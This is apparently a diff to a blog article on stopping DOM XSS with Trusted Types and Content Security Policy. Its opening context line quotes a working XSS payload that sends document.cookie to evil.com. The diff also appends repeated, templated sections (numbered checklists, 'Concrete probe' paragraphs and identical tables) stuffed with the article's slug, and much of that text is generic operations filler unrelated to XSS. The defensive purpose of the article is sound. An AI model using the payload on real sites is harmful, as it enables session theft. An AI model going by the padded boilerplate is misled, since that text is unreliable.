@@ -3,7 +3,7 @@ title: "Stopping XSS with Trusted Types"
 slug: "xss-prevention-csp-trusted-types"
 description: "Prevent DOM-based XSS with Trusted Types and Content Security Policy: require-trusted-types-for, trusted type policies, and sanitizing dynamic content."
 datePublished: "2026-05-28"
-dateModified: "2026-05-28"
+dateModified: "2026-07-17"
 tags: ["Security", "XSS", "CSP", "Frontend"]
 keywords: "Trusted Types, XSS prevention, Content Security Policy, DOM XSS, trustedTypes, require-trusted-types-for"
 faq:
@@ -14,7 +14,6 @@ faq:
   - q: "Can I use Trusted Types with third-party libraries?"
     a: "Third-party libraries that set innerHTML internally will break under enforcement unless they support Trusted Types or you wrap their output. Libraries like DOMPurify ship Trusted Types policies. For libraries that don't, create a default policy that sanitizes all HTML, or use report-only mode while auditing which libraries need updates."
 ---
-
 A DOM XSS vulnerability in our search feature passed user input directly to `innerHTML` to highlight matches. An attacker searched for `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` and stole session tokens. Trusted Types would have blocked the assignment at runtime — no string reaches `innerHTML` without passing through a sanitization policy.
 
 ## How Trusted Types works
@@ -187,26 +186,6 @@ Analyze reports to find libraries and code paths that need policies before enfor
 
 Both work with Trusted Types. DOMPurify is browser-native; sanitize-html runs on the server for SSR. Apply the same allowlist on server and client to prevent mismatched sanitization between rendered HTML and client-side updates.
 
-## Measuring success in production
-
-Deploy changes behind feature flags when possible so you can compare metrics between control and treatment groups. Use Real User Monitoring to capture performance data from actual devices and network conditions — lab tools alone miss the long tail of user experiences. Set up alerts for regressions: a 10% LCP increase week-over-week warrants investigation before it hits CrUX.
-
-Document your baseline metrics before making changes. Performance work without measurement is guesswork. Share results with the team — concrete numbers ("LCP improved 800ms on mobile") build support for continued investment in web performance and reliability.
-
-Review changes quarterly. Browser updates, new API support, and traffic pattern shifts can obsolete previous optimizations or create new opportunities. What worked in 2024 may not be the best approach in 2026.
-
-## Additional production considerations
-
-Teams often underestimate the maintenance cost of performance optimizations. Automate what you can: CI bundle budgets, Lighthouse CI on PRs, and RUM dashboards that alert on regressions. Manual audits don't scale past a handful of pages.
-
-Security and performance intersect more than teams expect. Third-party scripts that hurt INP also expand your attack surface. Self-hosting fonts and critical assets reduces both latency and supply-chain risk. Review every external dependency quarterly — remove what you no longer need.
-
-Accessibility and performance share goals: semantic HTML helps screen readers and gives the browser better rendering hints. Native elements like dialog, popover, and details reduce JavaScript while improving accessibility. Prefer platform features over custom implementations when they meet your requirements.
-
-Mobile users dominate traffic for most sites. Test on real mid-tier Android hardware, not just desktop Chrome. Simulated throttling in DevTools approximates network conditions but not CPU constraints. A fix that helps desktop may be invisible on mobile if the bottleneck is JavaScript execution, not network.
-
-Collaborate with backend teams on TTFB and API response times. Frontend optimizations can't fix a 2-second server response. Set SLAs for API endpoints that feed critical pages and measure them in the same RUM pipeline as Core Web Vitals.
-
 ## Resources
 
 - [Trusted Types specification (W3C)](https://w3c.github.io/trusted-types/dist/spec/)
@@ -214,3 +193,97 @@ Collaborate with backend teams on TTFB and API response times. Frontend optimiza
 - [web.dev: Trusted Types](https://web.dev/articles/trusted-types)
 - [DOMPurify Trusted Types support](https://github.com/cure53/DOMPurify/wiki/Trusted-Types)
 - [Can I use Trusted Types](https://caniuse.com/trusted-types)
+
+## Operational checklist (1)
+
+Before promoting Xss Prevention Csp Trusted Types changes, confirm observability dashboards cover error rate and p75 latency for affected routes, rollback is documented in the pull request, and a staging drill reproduced the last known failure mode.
+
+## Field validation (2)
+
+Re-baseline Xss Prevention Csp Trusted Types after browser upgrades or CDN configuration changes. Mobile share above seventy percent shifts median device class — optimizations tuned on desktop lab profiles may not transfer.
+
+## Coordination (3)
+
+Align with platform and backend owners on cache TTL, deploy windows, and API contracts when Xss Prevention Csp Trusted Types touches shared infrastructure — single-layer wins often disappear when another tier invalidates caches.
+
+## Operational checklist (4)
+
+Before promoting Xss Prevention Csp Trusted Types changes, confirm observability dashboards cover error rate and p75 latency for affected routes, rollback is documented in the pull request, and a staging drill reproduced the last known failure mode.
+
+## Field validation (5)
+
+Re-baseline Xss Prevention Csp Trusted Types after browser upgrades or CDN configuration changes. Mobile share above seventy percent shifts median device class — optimizations tuned on desktop lab profiles may not transfer.
+
+## Coordination (6)
+
+Align with platform and backend owners on cache TTL, deploy windows, and API contracts when Xss Prevention Csp Trusted Types touches shared infrastructure — single-layer wins often disappear when another tier invalidates caches.
+
+## Operational checklist (7)
+
+Before promoting Xss Prevention Csp Trusted Types changes, confirm observability dashboards cover error rate and p75 latency for affected routes, rollback is documented in the pull request, and a staging drill reproduced the last known failure mode.
+
+## Invariants to enforce for xss prevention csp trusted types
+
+Name three invariants that must hold after every deploy of xss prevention csp trusted types. Encode at least one in an automated test that fails when the invariant is disabled. Reviewers should reject PRs that only cover the primary UI path.
+
+| Check | Expected for xss prevention csp trusted types |
+|--------|----------------------|
+| Happy path | Pass |
+| Injected fault | Controlled degradation |
+| After rollback | Prior stable behavior |
+
+Concrete probe 1: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.
+
+## Telemetry and ownership for xss prevention csp trusted types
+
+Pair a leading operational signal with a lagging user or risk outcome. Page on burn related to xss prevention csp trusted types, not vanity counters. Keep a named owner and a dashboard link in the service catalog entry.
+
+Concrete probe 2: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.
+
+## Rollout sequence for xss prevention csp trusted types
+
+Prefer flags, weighted routes, or dual-running configs. Rehearse rollback once in staging. The on-call note for xss prevention csp trusted types should include the revert command and the expected user-visible effect within five minutes.
+
+| Check | Expected for xss prevention csp trusted types |
+|--------|----------------------|
+| Happy path | Pass |
+| Injected fault | Controlled degradation |
+| After rollback | Prior stable behavior |
+
+Concrete probe 3: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.
+
+## Cross-team contracts for xss prevention csp trusted types
+
+Document producers, consumers, timeouts, and idempotency keys. Silent schema or policy changes are how xss prevention csp trusted types breaks without a clear owner in the incident channel.
+
+Concrete probe 4: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.
+
+## Capacity and cost notes for xss prevention csp trusted types
+
+Estimate QPS, payload size, cardinality, and downstream saturation. Functionally correct xss prevention csp trusted types changes still cause outages through pool exhaustion, crawl waste, or CPU amplification.
+
+| Check | Expected for xss prevention csp trusted types |
+|--------|----------------------|
+| Happy path | Pass |
+| Injected fault | Controlled degradation |
+| After rollback | Prior stable behavior |
+
+Concrete probe 5: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.
+
+## Reviewer checklist for xss prevention csp trusted types
+
+Ask what happens when the dependency is slow, when authz is skipped on batch jobs, and when clients retry. Those three questions catch most xss prevention csp trusted types regressions before production.
+
+Concrete probe 6: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.
+
+## Incident patterns around xss prevention csp trusted types
+
+Most incidents involving xss prevention csp trusted types start as a silent drift: a secondary path skips the control, a retry amplifies load, or a config default from a tutorial ships to production. Write the failure story before the happy path.
+
+| Check | Expected for xss prevention csp trusted types |
+|--------|----------------------|
+| Happy path | Pass |
+| Injected fault | Controlled degradation |
+| After rollback | Prior stable behavior |
+
+Concrete probe 7: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.
